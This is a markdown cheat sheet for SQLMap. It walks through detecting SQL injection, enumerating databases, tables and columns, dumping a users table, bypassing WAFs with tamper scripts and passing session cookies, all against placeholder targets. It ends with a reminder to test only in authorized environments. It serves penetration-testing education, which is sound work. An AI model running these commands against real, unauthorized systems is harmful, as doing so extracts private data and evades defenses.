# SQLMap

SQLMap is an automated tool used to detect and exploit SQL injection vulnerabilities in web applications.

It supports a wide range of database management systems including:

- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite

SQLMap is commonly used during **web application penetration testing** after identifying injectable parameters.

---

# Installation

SQLMap is included in Kali Linux.

If not installed:

```bash
sudo apt install sqlmap
```

Verify installation: ```bash sqlmap --version ```

---

# Basic Usage

Test a URL parameter for SQL injection: ```bash sqlmap -u "http://target.com/page.php?id=1" ```

SQLMap will attempt to detect SQL injection automatically.

---

# Using POST Requests

Some applications send parameters using POST.

Example: ```bash sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" ```

---

# Using Request Files (Burp)

Requests captured with Burp Suite can be used directly.

Example: ```bash sqlmap -r request.txt ```

This allows testing complex requests with headers and cookies.

---

# Database Enumeration

List available databases: ```bash sqlmap -u "http://target.com/page.php?id=1" --dbs ```

List tables inside a database: ```bash sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables ```

List columns from a table: ```bash sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns ```

---

# Dump Database Data

Extract data from a table: ``` sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump ```

---

# Bypassing WAF

Increase detection level: ```bash sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 ```

Use tamper scripts: ```bash sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment ```

---

# Authentication

If authentication is required, cookies can be included.

Example: ```bash sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abcdef123456" ```

---

Output Results

Results are saved automatically by SQLMap in: ``` ~/.local/share/sqlmap/output/ ```

---

# Notes

SQLMap is a powerful automated tool but manual verification is still important.

Blindly exploiting injection points without understanding the application may produce inaccurate results.

Always perform testing only in **authorized environments.**